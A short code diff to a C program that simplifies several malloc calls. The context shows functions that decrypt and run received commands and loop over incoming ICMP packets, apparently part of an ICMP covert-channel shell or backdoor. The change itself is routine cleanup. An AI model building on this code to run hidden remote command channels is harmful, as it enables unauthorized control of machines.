@@ -23,7 +23,7 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
     FILE *ptr;
     char *command;
     size_t buffer_size, data_section_size = strlen((char *) data);
-    unsigned char *buffer = (unsigned char *) malloc(BUFFER_SIZE * sizeof(unsigned char));
+    unsigned char *buffer = (unsigned char *) malloc(BUFFER_SIZE);
     CHECK_ALLOC(buffer);
 
     // decrypt the command
@@ -91,14 +91,14 @@ void interact(int sockfd, char *dest_ip) {
     struct sockaddr_in addr;
     size_t nbytes, packet_size, output_size;
 
-    output = (unsigned char *) malloc(sizeof(unsigned char) * BUFFER_SIZE);
+    output = (unsigned char *) malloc(BUFFER_SIZE);
     CHECK_ALLOC(output);
 
     // calculating the packet size
     packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + BUFFER_SIZE;
 
     // allocating a buffer to store the recieved ICMP packet
-    packet = (unsigned char *) malloc(sizeof(unsigned char) * packet_size);
+    packet = (unsigned char *) malloc(packet_size);
     CHECK_ALLOC(packet);
 
     while (1) {
